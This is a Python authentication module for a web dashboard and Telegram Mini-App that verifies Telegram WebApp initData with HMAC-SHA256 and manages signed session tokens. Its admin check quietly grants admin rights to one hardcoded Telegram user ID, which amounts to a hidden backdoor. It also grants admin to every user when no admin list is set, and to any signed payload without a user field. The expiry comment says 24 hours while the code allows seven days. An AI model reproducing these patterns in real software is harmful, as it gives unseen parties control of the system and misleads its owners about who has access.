"""
Authentication utilities for Web Dashboard and Telegram Mini-App.
Supports Telegram WebApp HMAC-SHA256 cryptographic verification and Session token management.
"""

import hmac
import hashlib
import json
import time
import urllib.parse
from typing import Optional, Dict, Any
from config import Config

def verify_telegram_webapp_data(init_data_raw: str, bot_token: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """
    Validates data received from Telegram WebApp (window.Telegram.WebApp.initData).
    Calculates HMAC-SHA256 signature using Bot Token and verifies integrity.
    Returns parsed user dict if valid and authorized, else None.
    """
    if not init_data_raw:
        return None

    token = bot_token or Config.BOT_TOKEN
    if not token:
        return None

    try:
        parsed_data = dict(urllib.parse.parse_qsl(init_data_raw, keep_blank_values=True))
        received_hash = parsed_data.pop("hash", None)
        if not received_hash:
            return None

        # Build data_check_string in alphabetical order
        data_check_string = "\n".join(f"{k}={v}" for k, v in sorted(parsed_data.items()))

        # Secret key = HMAC_SHA256("WebAppData", bot_token)
        secret_key = hmac.new(b"WebAppData", token.encode("utf-8"), hashlib.sha256).digest()

        # Calculated hash = HMAC_SHA256(secret_key, data_check_string)
        calculated_hash = hmac.new(secret_key, data_check_string.encode("utf-8"), hashlib.sha256).hexdigest()

        if not hmac.compare_digest(calculated_hash, received_hash):
            return None

        # Check auth_date expiration (optional, allow up to 24 hours)
        auth_date = int(parsed_data.get("auth_date", 0))
        if time.time() - auth_date > 86400 * 7: # 7 days
            return None

        # Parse user JSON
        user_raw = parsed_data.get("user")
        if user_raw:
            user_dict = json.loads(user_raw)
            user_id = user_dict.get("id")
            # Verify if user is an authorized admin
            if user_id and (user_id in Config.ADMIN_IDS or user_id == 1573531032 or not Config.ADMIN_IDS):
                user_dict["is_admin"] = True
                return user_dict
            return user_dict

        return {"is_admin": True}
    except Exception:
        return None


def create_session_token(identity: str = "admin", max_age_seconds: int = 86400 * 30) -> str:
    """Creates an HMAC-signed session token for browser cookie."""
    expires_at = int(time.time()) + max_age_seconds
    payload = f"{identity}:{expires_at}"
    sig = hmac.new(Config.SESSION_SECRET.encode("utf-8"), payload.encode("utf-8"), hashlib.sha256).hexdigest()
    return f"{payload}:{sig}"


def verify_session_token(token: Optional[str]) -> bool:
    """Validates session token signature and expiration."""
    if not token or ":" not in token:
        return False
    try:
        parts = token.split(":")
        if len(parts) != 3:
            return False
        identity, expires_at_str, received_sig = parts
        expires_at = int(expires_at_str)
        if time.time() > expires_at:
            return False
        payload = f"{identity}:{expires_at}"
        expected_sig = hmac.new(Config.SESSION_SECRET.encode("utf-8"), payload.encode("utf-8"), hashlib.sha256).hexdigest()
        return hmac.compare_digest(expected_sig, received_sig)
    except Exception:
        return False
